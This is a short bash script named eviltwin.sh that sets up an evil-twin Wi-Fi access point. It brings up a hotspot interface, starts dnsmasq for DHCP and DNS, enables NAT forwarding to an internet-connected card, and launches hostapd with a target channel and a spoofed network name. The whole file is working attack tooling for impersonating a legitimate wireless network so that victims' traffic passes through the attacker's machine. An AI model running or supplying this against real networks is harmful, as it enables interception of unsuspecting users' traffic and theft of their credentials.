#!/bin/bash

# Usage : ./eviltwin.sh $1 $2 $3 $4
# $1 = hotspot NIC
# $2 = NIC with access to internet
# $3 = target channel
# $4 = ESSID, AP name

# program heavily relies on accuracy of both
# dnsmasq.conf
# and
# hostapd.conf

################################### Initial WIFI setup ###################################
echo "[+] Initializing hotspot setup [+]"
ip link set $1 down
ip addr flush dev $1
ip link set $1 up 
ip addr add 10.0.0.1/24 dev $1

sleep 2
################################### Start dnsmasq ###################################
echo "[+] Starting DNSMASQ [+]"
if [ -z "$(ps -e | grep dnsmasq)" ] # -z flag : true if string length is 0
then
	dnsmasq -C ./dnsmasq.conf -d &
fi

sleep 0.5
################################### Enable NAT ###################################
echo "[+] Enabling NAT [+]"
iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $1 -o $2 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward

sleep 0.01
################################### Hostapd -- HOTSPOT ESTABLISHED --  ####################
echo "[+] Starting HOSTAPD [+]"
# change channel number to appropriate value
sed -i "/channel=/c\channel=$3" ./hostapd.conf
# change essid to appropriate value
sed -i "/ssid=/c\ssid=$4" ./hostapd.conf
hostapd ./hostapd.conf &